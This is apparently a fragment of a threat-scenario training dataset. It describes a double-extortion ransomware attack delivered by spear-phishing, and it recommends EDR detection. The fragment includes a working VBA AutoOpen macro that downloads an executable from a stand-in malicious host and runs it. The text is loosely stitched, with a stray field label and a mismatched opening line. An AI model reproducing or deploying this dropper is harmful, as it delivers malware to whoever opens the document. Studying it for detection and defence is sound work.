The ransomware was executed via a scheduled task created remotely, and exfiltration was masked inside SSH traffic to evade detection.

Employ Endpoint Detection and Response (EDR) to detect ransomware encryption activity and suspicious process chains. samples.scenario: Double extortion ransomware attack leveraging a malicious macro in a Word document attachment sent via spear phishing email. The macro downloads and executes ransomware which encrypts files and simultaneously exfiltrates data via DNS tunneling to bypass perimeter defenses. The DNS exfiltration was identified through unusual DNS query patterns with large payloads encoded in subdomains.

Sub AutoOpen()
 Dim strURL As String
 strURL = "http://cdn.malicious-site.com/payload.exe"
 Dim WinHttpReq As Object
 Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
 WinHttpReq.Open "GET", strURL, False
 WinHttpReq.Send
 If WinHttpReq.Status = 200 Then
   Dim oStream As Object
   Set oStream = CreateObject("ADODB.Stream")
   oStream.Open
   oStream.Type = 1
   oStream.Write WinHttpReq.responseBody
   oStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
   oStream.Close
   Shell Environ("TEMP") & "\payload.exe"
 End If
End Sub
